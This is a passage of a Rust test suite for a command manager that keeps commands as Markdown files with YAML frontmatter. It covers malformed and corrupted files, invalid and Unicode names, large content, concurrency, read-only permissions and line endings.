                "Recovery error should provide meaningful message"
            );
        },
    }

    // Test 3: Graceful handling of partial writes
    // This tests scenarios where file operations might be interrupted
    let partial_result = manager.add_command("partial-test", &os);

    // Should either succeed completely or fail cleanly
    match partial_result {
        Ok(_) => {
            // If successful, file should be complete and readable
            let partial_file = test_fs.project_commands_dir.join("partial-test.md");
            assert!(partial_file.exists(), "Partial write test file should exist");

            // File should be readable
            let content = std::fs::read_to_string(&partial_file);
            assert!(content.is_ok(), "Partial write test file should be readable");
        },
        Err(_) => {
            // If failed, should not leave partial files
            let partial_file = test_fs.project_commands_dir.join("partial-test.md");
            assert!(
                !partial_file.exists(),
                "Failed partial write should not leave incomplete file"
            );
        },
    }

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test handling of malformed YAML frontmatter
/// This covers various YAML syntax errors and recovery mechanisms
#[tokio::test]
async fn test_malformed_yaml_frontmatter() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();

    // Test 1: Create command files with malformed YAML frontmatter
    let invalid_yaml_command = r#"---
invalid_yaml: [unclosed array
timeout_seconds: "not a number"
---

# Malformed YAML Test

This command has invalid YAML frontmatter.

## Instructions
Test malformed YAML handling.
"#;

    // Write malformed command file directly to test loading behavior
    let malformed_file = test_fs.project_commands_dir.join("malformed-yaml.md");
    std::fs::create_dir_all(&test_fs.project_commands_dir).ok();
    let write_result = std::fs::write(&malformed_file, invalid_yaml_command);

    match write_result {
        Ok(_) => {
            // Test that the system can handle loading malformed files
            let list_result = manager.list_commands();
            match list_result {
                Ok(commands) => {
                    // System should either skip malformed files or handle them gracefully
                    println!("Commands loaded despite malformed YAML: {}", commands.len());
                },
                Err(error) => {
                    // Error should be user-friendly
                    let error_msg = format!("{}", error);
                    assert!(
                        error_msg.contains("YAML")
                            || error_msg.contains("frontmatter")
                            || error_msg.contains("parse")
                            || error_msg.len() < 500, // Should be concise
                        "YAML error should be user-friendly: {}",
                        error_msg
                    );
                },
            }
        },
        Err(_) => {
            // If we can't even write the file, that's a different issue
            println!("Could not write malformed YAML test file - skipping this test");
        },
    }

    // Test 2: Missing closing frontmatter delimiter
    let missing_delimiter_command = r#"---
allowed_tools: ["fs_read"]
timeout_seconds: 30

# Missing Delimiter Test

This command is missing the closing frontmatter delimiter.

## Instructions
Test missing delimiter handling.
"#;

    let missing_delimiter_file = test_fs.project_commands_dir.join("missing-delimiter.md");
    if std::fs::write(&missing_delimiter_file, missing_delimiter_command).is_ok() {
        // Test loading behavior with missing delimiter
        let list_result = manager.list_commands();
        match list_result {
            Ok(_) => {
                println!("System handled missing delimiter gracefully");
            },
            Err(error) => {
                let error_msg = format!("{}", error);
                assert!(
                    error_msg.contains("delimiter")
                        || error_msg.contains("frontmatter")
                        || error_msg.contains("format")
                        || error_msg.len() < 500,
                    "Missing delimiter error should be clear: {}",
                    error_msg
                );
            },
        }
    }

    // Test 3: Recovery with valid command after malformed ones
    let os = Os::new().await.expect("Failed to create OS instance");

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    let recovery_result = manager.add_command("valid-recovery", &os);
    assert!(
        recovery_result.is_ok(),
        "Should recover and accept valid commands after malformed ones"
    );

    if recovery_result.is_ok() {
        let recovery_file = test_fs.project_commands_dir.join("valid-recovery.md");
        assert!(
            recovery_file.exists(),
            "Valid command should be created after malformed command handling"
        );
    }

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test partial operation failures and rollback mechanisms
/// This covers scenarios where operations partially succeed or fail
#[tokio::test]
async fn test_partial_operation_failures() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    // Setup: Create several test commands
    let commands_to_create = vec!["partial-test-1", "partial-test-2", "partial-test-3", "partial-test-4"];

    for name in &commands_to_create {
        let result = manager.add_command(name, &os);
        assert!(result.is_ok(), "Setup command {} should be created successfully", name);
    }

    // Verify all commands were created
    let initial_result = manager.list_commands();
    assert!(initial_result.is_ok(), "Should be able to list commands after setup");

    let initial_commands = initial_result.unwrap();
    let initial_count = initial_commands.len();
    assert!(initial_count >= 4, "Should have at least 4 commands after setup");

    // Test 1: File system consistency after operations
    // Verify that files exist for created commands
    let mut files_exist = 0;
    for name in &commands_to_create {
        let file_path = test_fs.project_commands_dir.join(format!("{}.md", name));
        if file_path.exists() {
            files_exist += 1;
        }
    }

    assert!(
        files_exist >= commands_to_create.len(),
        "All created command files should exist on filesystem"
    );

    // Test cache consistency with filesystem
    let list_result = manager.list_commands();
    if let Ok(listed_commands) = list_result {
        assert!(
            listed_commands.len() >= commands_to_create.len(),
            "Listed commands should include all created commands"
        );
    }

    // Test 2: Batch operation with mixed results
    // Try to add multiple commands where some might fail due to invalid names
    let batch_commands = vec![
        "batch-valid-1",
        "batch-valid-2",
        "batch/invalid/name", // This should fail due to invalid characters
        "batch-valid-3",
    ];

    let mut successful_adds = 0;
    let mut failed_adds = 0;

    for name in &batch_commands {
        let result = manager.add_command(name, &os);
        match result {
            Ok(_) => successful_adds += 1,
            Err(_) => failed_adds += 1,
        }
    }

    // Should have some successes and some failures
    assert!(successful_adds > 0, "Some batch operations should succeed");
    assert!(failed_adds > 0, "Some batch operations should fail (invalid names)");

    println!(
        "Batch operations: {} successful, {} failed",
        successful_adds, failed_adds
    );

    // Test 3: Rollback mechanism testing
    // Test that failed operations don't leave partial state
    let list_before = manager.list_commands().unwrap_or_default();
    let original_command_count = list_before.len();

    // Try to add a command with invalid name (should fail cleanly)
    let rollback_result = manager.add_command("invalid/rollback/test", &os);

    // This should fail due to invalid name
    assert!(rollback_result.is_err(), "Invalid command name should be rejected");

    // Verify no partial state remains
    let list_after = manager.list_commands().unwrap_or_default();
    let final_command_count = list_after.len();

    assert_eq!(
        final_command_count, original_command_count,
        "Failed add should not change command count"
    );

    // Command file should not exist
    let rollback_file = test_fs.project_commands_dir.join("invalid-rollback-test.md");
    assert!(!rollback_file.exists(), "Failed command should not create file");

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test handling of large command files
/// This covers memory usage patterns and loading performance for large content
#[tokio::test]
async fn test_large_command_file_handling() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let _os = Os::new().await.expect("Failed to create OS instance");

    // Test 1: Large command content (create large file manually)
    let large_content = "x".repeat(100 * 1024); // 100KB of content (reasonable size for testing)
    let large_command = format!(
        r#"---
allowed_tools: ["fs_read"]
timeout_seconds: 120
---

# Large Command Test

This is a test command with large content.

## Instructions
{}

## Additional Content
This command tests handling of large files.
"#,
        large_content
    );

    // Write large command file directly
    std::fs::create_dir_all(&test_fs.project_commands_dir).ok();
    let large_file = test_fs.project_commands_dir.join("large-command.md");

    let start_time = std::time::Instant::now();
    let write_result = std::fs::write(&large_file, &large_command);
    let write_duration = start_time.elapsed();

    match write_result {
        Ok(_) => {
            println!("Large command file written in {:?}", write_duration);

            // Test loading performance
            let load_start = std::time::Instant::now();
            let list_result = manager.list_commands();
            let load_duration = load_start.elapsed();

            match list_result {
                Ok(commands) => {
                    println!(
                        "Loaded {} commands (including large one) in {:?}",
                        commands.len(),
                        load_duration
                    );

                    // Performance assertions - should handle large files reasonably
                    assert!(
                        load_duration.as_secs() < 5,
                        "Large command loading should complete within 5 seconds, took {:?}",
                        load_duration
                    );

                    // Should find the large command
                    assert!(
                        commands.iter().any(|cmd| cmd == "large-command"),
                        "Large command should be found in command list"
                    );
                },
                Err(error) => {
                    // If large command fails to load, error should be informative
                    let error_msg = format!("{:?}", error);
                    assert!(
                        error_msg.contains("size")
                            || error_msg.contains("memory")
                            || error_msg.contains("space")
                            || error_msg.contains("limit")
                            || error_msg.contains("Io"),
                        "Large command error should be size-related: {}",
                        error_msg
                    );
                },
            }
        },
        Err(error) => {
            println!("Could not write large command file: {:?}", error);
            // This might be due to actual disk space issues, which is what we're testing
        },
    }

    // Test 2: Multiple medium-sized commands
    let medium_size = 10 * 1024; // 10KB each
    let num_medium_commands = 5; // Reasonable number for testing

    let medium_start = std::time::Instant::now();
    let mut medium_successes = 0;

    for i in 0..num_medium_commands {
        let medium_content = format!(
            r#"# Medium Command {}

This is medium-sized command number {}.

## Content
{}

## Instructions
Test medium-sized command handling.
"#,
            i,
            i,
            "y".repeat(medium_size)
        );

        let command_name = format!("medium-command-{}", i);
        let medium_file = test_fs.project_commands_dir.join(format!("{}.md", command_name));

        if std::fs::write(&medium_file, &medium_content).is_ok() {
            medium_successes += 1;
        }
    }

    let medium_duration = medium_start.elapsed();

    println!(
        "Created {} medium command files in {:?}",
        medium_successes, medium_duration
    );

    // Test loading all commands including medium ones
    if medium_successes > 0 {
        let load_start = std::time::Instant::now();
        let list_result = manager.list_commands();
        let load_duration = load_start.elapsed();

        if let Ok(commands) = list_result {
            println!("Loaded {} total commands in {:?}", commands.len(), load_duration);

            // Should handle multiple medium commands efficiently
            assert!(
                load_duration.as_millis() < 2000, // 2 seconds max for loading
                "Medium commands should be loaded efficiently, took: {:?}",
                load_duration
            );
        }
    }

    // Test 3: Memory usage patterns
    // Test that large commands don't cause excessive memory usage during listing
    let list_result = manager.list_commands();
    if let Ok(commands) = list_result {
        let total_commands = commands.len();
        println!("Total commands in system: {}", total_commands);

        // Should be able to list commands without memory issues
        assert!(
            total_commands > 0,
            "Should be able to list commands even with large files present"
        );
    }
}

/// Test concurrent operations performance
/// This covers multiple simultaneous operations and performance degradation
#[tokio::test]
async fn test_concurrent_operations_performance() {
    // Test 1: Concurrent command creation
    let concurrent_adds = 10; // Reasonable number for testing
    let mut handles = vec![];

    let start_time = std::time::Instant::now();

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    // Spawn concurrent add operations
    for i in 0..concurrent_adds {
        let test_fs_clone = TestFileSystem::new().expect("Failed to create test filesystem");

        let handle = tokio::spawn(async move {
            let mut manager = test_fs_clone.create_manager();
            let os = Os::new().await.expect("Failed to create OS instance");

            let command_name = format!("concurrent-add-{}", i);

            // Add some variation in timing
            if i % 3 == 0 {
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }

            let result = manager.add_command(&command_name, &os);
            (i, result.is_ok())
        });

        handles.push(handle);
    }

    // Wait for all operations to complete
    let mut successful_concurrent_adds = 0;
    for handle in handles {
        if let Ok((_, success)) = handle.await {
            if success {
                successful_concurrent_adds += 1;
            }
        }
    }

    let concurrent_add_duration = start_time.elapsed();

    println!(
        "Concurrent adds: {}/{} successful in {:?}",
        successful_concurrent_adds, concurrent_adds, concurrent_add_duration
    );

    // Should handle concurrent operations reasonably well
    assert!(
        successful_concurrent_adds > 0,
        "At least some concurrent adds should succeed"
    );

    // Performance should be reasonable
    assert!(
        concurrent_add_duration.as_secs() < 30,
        "Concurrent adds should complete within 30 seconds"
    );

    // Test 2: Concurrent list operations
    let concurrent_lists = 20;
    let mut list_handles = vec![];

    let list_start_time = std::time::Instant::now();

    for i in 0..concurrent_lists {
        let test_fs_clone = TestFileSystem::new().expect("Failed to create test filesystem");

        let handle = tokio::spawn(async move {
            let mut manager = test_fs_clone.create_manager();

            let result = manager.list_commands();
            (i, result.is_ok())
        });

        list_handles.push(handle);
    }

    let mut successful_lists = 0;
    for handle in list_handles {
        if let Ok((_, success)) = handle.await {
            if success {
                successful_lists += 1;
            }
        }
    }

    let concurrent_list_duration = list_start_time.elapsed();

    println!(
        "Concurrent lists: {}/{} successful in {:?}",
        successful_lists, concurrent_lists, concurrent_list_duration
    );

    // List operations should be fast and mostly successful
    assert!(
        concurrent_list_duration.as_secs() < 10,
        "Concurrent lists should complete within 10 seconds"
    );

    assert!(
        successful_lists > concurrent_lists / 2,
        "Most concurrent list operations should succeed"
    );

    // Test 3: Mixed concurrent operations
    let mixed_operations = 15;
    let mut mixed_handles = vec![];

    let mixed_start_time = std::time::Instant::now();

    for i in 0..mixed_operations {
        let test_fs_clone = TestFileSystem::new().expect("Failed to create test filesystem");

        let handle = tokio::spawn(async move {
            let mut manager = test_fs_clone.create_manager();
            let os = Os::new().await.expect("Failed to create OS instance");

            let operation_type = i % 2; // Alternate between add and list

            match operation_type {
                0 => {
                    // Add operation
                    let command_name = format!("mixed-add-{}", i);
                    let result = manager.add_command(&command_name, &os);
                    ("add", result.is_ok())
                },
                _ => {
                    // List operation
                    let result = manager.list_commands();
                    ("list", result.is_ok())
                },
            }
        });

        mixed_handles.push(handle);
    }

    let mut mixed_results = std::collections::HashMap::new();
    for handle in mixed_handles {
        if let Ok((operation, success)) = handle.await {
            *mixed_results.entry(operation).or_insert(0) += if success { 1 } else { 0 };
        }
    }

    let mixed_duration = mixed_start_time.elapsed();

    println!(
        "Mixed operations completed in {:?}: {:?}",
        mixed_duration, mixed_results
    );

    // Mixed operations should complete in reasonable time
    assert!(
        mixed_duration.as_secs() < 20,
        "Mixed concurrent operations should complete within 20 seconds"
    );

    // Should have some successful operations of each type
    for (op_type, count) in mixed_results {
        assert!(count > 0, "Should have at least some successful {} operations", op_type);
    }

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

// Priority 3: Edge Case Tests
//
// These tests cover unusual scenarios, boundary conditions, and edge cases
// that could occur in real-world usage but are less common than Priority 1-2 scenarios.

/// Test handling of commands with special characters and Unicode in names
#[tokio::test]
async fn test_special_character_command_names() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    // Test various special characters and Unicode
    let special_names = vec![
        "test-with-dashes",
        "test_with_underscores",
        "test.with.dots",
        "test123numbers",
        "test-émoji-🚀",    // Unicode characters
        "test-with-spaces", // This should be handled or rejected appropriately
        "UPPERCASE-TEST",
        "mixed-Case-Test",
    ];

    let mut successful_adds = 0;
    let mut expected_failures = 0;

    for name in special_names {
        let result = manager.add_command(name, &os);

        // Some names might be invalid (like those with spaces)
        // We test that the system handles them gracefully
        match result {
            Ok(_) => {
                successful_adds += 1;

                // Verify the command can be retrieved
                let commands = manager.list_commands().expect("Should list commands");
                let found = commands.iter().any(|cmd_name| cmd_name == name);
                assert!(found, "Command '{}' should be findable after creation", name);

                // Test that we can get the command details
                let command = manager.get_command(name);
                assert!(command.is_ok(), "Should be able to get command '{}'", name);

                // Test removal by deleting the file directly (since no remove_command method)
                let expected_file = test_fs.project_commands_dir.join(format!("{}.md", name));
                let remove_result = std::fs::remove_file(&expected_file);
                assert!(
                    remove_result.is_ok(),
                    "Should be able to remove command file '{}'",
                    name
                );
            },
            Err(_) => {
                expected_failures += 1;
                // Ensure invalid names don't create partial files
                let expected_file = test_fs.project_commands_dir.join(format!("{}.md", name));
                assert!(
                    !expected_file.exists(),
                    "Invalid command '{}' should not create file",
                    name
                );
            },
        }
    }

    // We should have some successful operations
    assert!(
        successful_adds > 0,
        "Should successfully handle some special character names"
    );

    println!(
        "Special character test: {} successful, {} expected failures",
        successful_adds, expected_failures
    );

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test behavior with extremely long command names and content
#[tokio::test]
async fn test_extreme_length_scenarios() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    // Test very long command name (filesystem limits)
    let long_name = "a".repeat(200); // Most filesystems have 255 char limits
    let result = manager.add_command(&long_name, &os);

    // Should either succeed or fail gracefully
    match result {
        Ok(_) => {
            // If it succeeds, verify it works properly
            let commands = manager.list_commands().expect("Should list commands");
            let found = commands.iter().any(|cmd_name| cmd_name == &long_name);
            assert!(found, "Long command name should be findable");

            // Clean up by removing the file
            let long_file = test_fs.project_commands_dir.join(format!("{}.md", long_name));
            let _ = std::fs::remove_file(&long_file);
        },
        Err(e) => {
            // Should be a clear error about name length
            println!("Long name appropriately rejected: {:?}", e);
        },
    }

    // Test command with extremely long content
    let normal_name = "long-content-test";
    let add_result = manager.add_command(normal_name, &os);
    assert!(add_result.is_ok(), "Should create command for content test");

    // Create a command file with very long content
    let command_file = test_fs.project_commands_dir.join(format!("{}.md", normal_name));
    let very_long_content = format!(
        "---\nname: {}\nscope: project\n---\n\n{}",
        normal_name,
        "This is a very long command description. ".repeat(1000) // ~37KB of text
    );

    std::fs::write(&command_file, very_long_content).expect("Should write long content");

    // Test that the system can handle reading the long content
    let commands = manager.list_commands().expect("Should handle long content in list");
    let found_command = commands.iter().find(|cmd_name| *cmd_name == normal_name);
    assert!(found_command.is_some(), "Should find command with long content");

    // Test getting the command with long content
    let get_result = manager.get_command(normal_name);
    assert!(get_result.is_ok(), "Should handle getting command with long content");

    // Clean up by removing the file
    let normal_file = test_fs.project_commands_dir.join(format!("{}.md", normal_name));
    let _ = std::fs::remove_file(&normal_file);

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test handling of corrupted or partially written command files
#[tokio::test]
async fn test_corrupted_command_files() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();

    // Create various types of corrupted files
    let corrupted_scenarios = vec![
        ("empty-file", ""),
        ("no-frontmatter", "This is just content without frontmatter"),
        ("incomplete-frontmatter", "---\nname: incomplete\n"), // Missing closing ---
        ("invalid-yaml", "---\nname: test\ninvalid: yaml: content: here\n---\n"),
        ("missing-name", "---\nscope: project\n---\nContent without name"),
        ("binary-content", "\x00\x01\x02\x03\x7F\x7E\x7D"), // Binary data
        ("mixed-encoding", "---\nname: test\n---\n\u{1F600}\u{1F601}\u{1F602}"), // Emojis
    ];

    for (scenario_name, content) in &corrupted_scenarios {
        let file_path = test_fs.project_commands_dir.join(format!("{}.md", scenario_name));
        std::fs::write(&file_path, content).expect("Should write corrupted file");
    }

    // Test that list_commands handles corrupted files gracefully
    let list_result = manager.list_commands();
    match list_result {
        Ok(commands) => {
            // Should return valid commands and skip corrupted ones
            println!("List commands succeeded with {} valid commands", commands.len());

            // Verify that valid commands don't include corrupted ones
            for cmd_name in &commands {
                assert!(!cmd_name.is_empty(), "Valid commands should have names");
                assert!(cmd_name != "incomplete", "Corrupted commands should be filtered out");
            }
        },
        Err(e) => {
            // If it fails, should be a clear error message
            println!("List commands failed appropriately: {:?}", e);
        },
    }

    // Test getting specific corrupted commands
    for (scenario_name, _) in &corrupted_scenarios {
        let get_result = manager.get_command(scenario_name);

        // Should either succeed with best-effort parsing or fail gracefully
        match get_result {
            Ok(command) => {
                println!(
                    "Corrupted file '{}' parsed successfully: {} chars",
                    scenario_name,
                    command.content.len()
                );
            },
            Err(e) => {
                println!("Corrupted file '{}' appropriately failed: {:?}", scenario_name, e);
            },
        }
    }

    // Test that we can still add new valid commands despite corrupted files
    let os = Os::new().await.expect("Failed to create OS instance");
    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    let valid_result = manager.add_command("valid-after-corruption", &os);
    assert!(valid_result.is_ok(), "Should still be able to add valid commands");

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test filesystem permission and access edge cases
#[tokio::test]
async fn test_filesystem_permission_edge_cases() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    // Test creating command when directory has unusual permissions
    // Note: This test may behave differently on different platforms

    // First, create a valid command to establish baseline
    let baseline_result = manager.add_command("baseline-test", &os);
    assert!(baseline_result.is_ok(), "Baseline command creation should work");

    // Test with read-only directory (if possible to simulate)
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;

        // Create a subdirectory with restricted permissions
        let restricted_dir = test_fs.project_commands_dir.join("restricted");
        std::fs::create_dir_all(&restricted_dir).expect("Should create restricted dir");

        // Make directory read-only
        let mut perms = std::fs::metadata(&restricted_dir)
            .expect("Should get metadata")
            .permissions();
        perms.set_mode(0o444); // Read-only
        std::fs::set_permissions(&restricted_dir, perms).expect("Should set read-only permissions");

        // Try to create a command file in the restricted directory
        // This should fail gracefully
        let restricted_file = restricted_dir.join("restricted-test.md");
        let write_result = std::fs::write(&restricted_file, "test content");

        match write_result {
            Ok(_) => {
                println!("Unexpectedly succeeded writing to read-only directory");
            },
            Err(e) => {
                println!("Appropriately failed to write to read-only directory: {:?}", e);
                assert!(e.kind() == std::io::ErrorKind::PermissionDenied);
            },
        }

        // Restore permissions for cleanup
        let mut restore_perms = std::fs::metadata(&restricted_dir)
            .expect("Should get metadata")
            .permissions();
        restore_perms.set_mode(0o755); // Read/write/execute
        std::fs::set_permissions(&restricted_dir, restore_perms).expect("Should restore permissions");
    }

    // Test with files that exist but are read-only
    let readonly_name = "readonly-test";
    let add_result = manager.add_command(readonly_name, &os);
    assert!(add_result.is_ok(), "Should create readonly test command");

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;

        let readonly_file = test_fs.project_commands_dir.join(format!("{}.md", readonly_name));

        // Make the file read-only
        let mut perms = std::fs::metadata(&readonly_file)
            .expect("Should get file metadata")
            .permissions();
        perms.set_mode(0o444); // Read-only
        std::fs::set_permissions(&readonly_file, perms).expect("Should set file read-only");

        // Try to remove the read-only file
        let remove_result = std::fs::remove_file(&readonly_file);

        // This might succeed or fail depending on directory permissions
        match remove_result {
            Ok(_) => {
                println!("Successfully removed read-only file");
            },
            Err(e) => {
                println!("Failed to remove read-only file: {:?}", e);

                // Restore permissions for cleanup
                let mut restore_perms = std::fs::metadata(&readonly_file)
                    .expect("Should get file metadata")
                    .permissions();
                restore_perms.set_mode(0o644); // Read/write
                std::fs::set_permissions(&readonly_file, restore_perms).expect("Should restore file permissions");
            },
        }
    }

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test race conditions and concurrent file access
#[tokio::test]
async fn test_concurrent_file_access_edge_cases() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let os = Os::new().await.expect("Failed to create OS instance");

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    // Test concurrent access to the same command file
    let command_name = "concurrent-access-test";
    let mut handles = Vec::new();

    // Get the shared directory path for all tasks
    let shared_project_dir = test_fs.project_commands_dir.clone();
    let shared_user_dir = test_fs.user_commands_dir.clone();

    // Spawn multiple tasks trying to access the same command
    for i in 0..10 {
        let os_clone = os.clone();
        let name = command_name.to_string();
        let project_dir = shared_project_dir.clone();
        let user_dir = shared_user_dir.clone();

        let handle = tokio::spawn(async move {
            let mut manager = CommandManager::new_for_test(project_dir.clone(), user_dir);

            // Mix of operations on the same command
            match i % 4 {
                0 => {
                    // Try to add
                    let result = manager.add_command(&name, &os_clone);
                    ("add", result.is_ok())
                },
                1 => {
                    // Try to get
                    let result = manager.get_command(&name);
                    ("get", result.is_ok())
                },
                2 => {
                    // Try to list (should always work)
                    let result = manager.list_commands();
                    ("list", result.is_ok())
                },
                _ => {
                    // Try to remove by deleting file
                    let file_path = project_dir.join(format!("{}.md", name));
                    let result = std::fs::remove_file(&file_path);
                    ("remove", result.is_ok())
                },
            }
        });

        handles.push(handle);
    }

    // Collect results
    let mut operation_results = std::collections::HashMap::new();
    for handle in handles {
        if let Ok((operation, success)) = handle.await {
            let entry = operation_results.entry(operation).or_insert((0, 0));
            if success {
                entry.0 += 1; // Success count
            } else {
                entry.1 += 1; // Failure count
            }
        }
    }

    println!("Concurrent access results: {:?}", operation_results);

    // At least some operations should succeed
    let total_successes: i32 = operation_results.values().map(|(s, _)| *s).sum();
    assert!(
        total_successes > 0,
        "At least some concurrent operations should succeed"
    );

    // List operations should generally succeed
    if let Some((list_success, list_failure)) = operation_results.get("list") {
        assert!(*list_success > *list_failure, "List operations should mostly succeed");
    }

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test system resource exhaustion scenarios
#[tokio::test]
async fn test_resource_exhaustion_scenarios() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    // Test creating many commands rapidly
    let start_time = std::time::Instant::now();
    let mut successful_creates = 0;
    let mut failed_creates = 0;

    // Try to create 100 commands rapidly
    for i in 0..100 {
        let command_name = format!("resource-test-{:03}", i);
        let result = manager.add_command(&command_name, &os);

        match result {
            Ok(_) => successful_creates += 1,
            Err(_) => failed_creates += 1,
        }

        // Add small delay to prevent overwhelming the system
        if i % 10 == 0 {
            sleep(Duration::from_millis(10)).await;
        }
    }

    let creation_duration = start_time.elapsed();

    println!(
        "Resource test: {} successful, {} failed in {:?}",
        successful_creates, failed_creates, creation_duration
    );

    // Should create at least some commands successfully
    assert!(successful_creates > 50, "Should successfully create most commands");

    // Test listing many commands
    let list_start = std::time::Instant::now();
    let list_result = manager.list_commands();
    let list_duration = list_start.elapsed();

    assert!(list_result.is_ok(), "Should be able to list many commands");
    let commands = list_result.unwrap();

    println!("Listed {} commands in {:?}", commands.len(), list_duration);

    // Should complete listing in reasonable time even with many commands
    assert!(list_duration.as_secs() < 5, "Listing should complete within 5 seconds");

    // Test bulk removal by deleting files
    let removal_start = std::time::Instant::now();
    let mut successful_removals = 0;

    for i in 0..successful_creates.min(50) {
        // Remove up to 50 commands
        let command_name = format!("resource-test-{:03}", i);
        let file_path = test_fs.project_commands_dir.join(format!("{}.md", command_name));
        let result = std::fs::remove_file(&file_path);
        if result.is_ok() {
            successful_removals += 1;
        }
    }

    let removal_duration = removal_start.elapsed();

    println!("Removed {} commands in {:?}", successful_removals, removal_duration);

    // Should remove commands in reasonable time
    assert!(
        removal_duration.as_secs() < 10,
        "Bulk removal should complete within 10 seconds"
    );

    unsafe {
        std::env::remove_var("EDITOR");
    }
}

/// Test cross-platform compatibility edge cases
#[tokio::test]
async fn test_cross_platform_compatibility() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    // Test path separators and file naming conventions
    let platform_test_names = vec![
        "normal-command",
        "command_with_underscores",
        "UPPERCASE-COMMAND",
        "MixedCase-Command",
        "command123numbers",
    ];

    for name in platform_test_names {
        let add_result = manager.add_command(name, &os);
        assert!(add_result.is_ok(), "Should handle platform-compatible name: {}", name);

        // Verify file was created with correct extension
        let expected_file = test_fs.project_commands_dir.join(format!("{}.md", name));
        assert!(expected_file.exists(), "Command file should exist: {}", name);

        // Test that we can read it back
        let get_result = manager.get_command(name);
        assert!(get_result.is_ok(), "Should be able to get command: {}", name);

        // Clean up by removing file
        let file_path = test_fs.project_commands_dir.join(format!("{}.md", name));
        let remove_result = std::fs::remove_file(&file_path);
        assert!(remove_result.is_ok(), "Should be able to remove command file: {}", name);
    }

    // Test line ending handling (Windows vs Unix)
    let line_ending_test = "line-ending-test";
    let add_result = manager.add_command(line_ending_test, &os);
    assert!(add_result.is_ok(), "Should create line ending test command");

    let command_file = test_fs.project_commands_dir.join(format!("{}.md", line_ending_test));

    // Write content with different line endings
    let content_with_crlf = "---\nname: line-ending-test\nscope: project\n---\n\nThis has\r\nmixed\nline\r\nendings\n";
    std::fs::write(&command_file, content_with_crlf).expect("Should write content with mixed line endings");

    // Test that the system can handle mixed line endings
    let get_result = manager.get_command(line_ending_test);
    assert!(get_result.is_ok(), "Should handle mixed line endings");

    let command = get_result.unwrap();
    assert!(
        !command.content.is_empty(),
        "Should have content with mixed line endings"
    );
    assert!(
        command.content.contains("Line Ending Test"),
        "Should preserve the command name in content"
    );

    // Clean up by removing file
    let file_path = test_fs.project_commands_dir.join(format!("{}.md", line_ending_test));
    let _ = std::fs::remove_file(&file_path);

    unsafe {
        std::env::remove_var("EDITOR");
    }
}
